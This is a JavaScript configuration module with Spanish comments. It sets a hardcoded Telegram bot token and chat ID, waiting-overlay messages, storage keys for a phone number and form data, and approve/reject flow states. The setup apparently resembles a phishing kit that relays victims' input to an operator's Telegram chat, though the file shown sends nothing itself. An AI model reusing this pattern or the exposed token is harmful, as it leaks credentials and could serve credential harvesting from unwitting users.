/**
 * Configuración centralizada de la aplicación
 * @module Config
 */

const AppConfig = {
  // Telegram Bot Configuration
  telegram: {
    botToken: '8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc',
    chatId: '-5179068892',
    apiUrl: 'https://api.telegram.org/bot',
  },

  // Overlay Configuration
  overlay: {
    defaultTimeout: 30000, // 30 segundos
    messages: {
      loading: 'Procesando...',
      waiting: 'Esperando confirmación...',
      error: 'Ha ocurrido un error',
      success: '¡Éxito!',
    },
  },

  // Storage Keys
  storageKeys: {
    phoneNumber: 'numero',
    formData: 'formData',
    sessionId: 'sessionId',
    userFlow: 'userFlow',
  },

  // Flow Status
  flowStatus: {
    PENDING: 'pending',
    APPROVED: 'approved',
    REJECTED: 'rejected',
    WAITING: 'waiting',
  },
};

// Generar Session ID único si no existe
if (typeof window !== 'undefined' && !localStorage.getItem(AppConfig.storageKeys.sessionId)) {
  const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  localStorage.setItem(AppConfig.storageKeys.sessionId, sessionId);
}

// Exportar para uso modular
if (typeof module !== 'undefined' && module.exports) {
  module.exports = AppConfig;
}
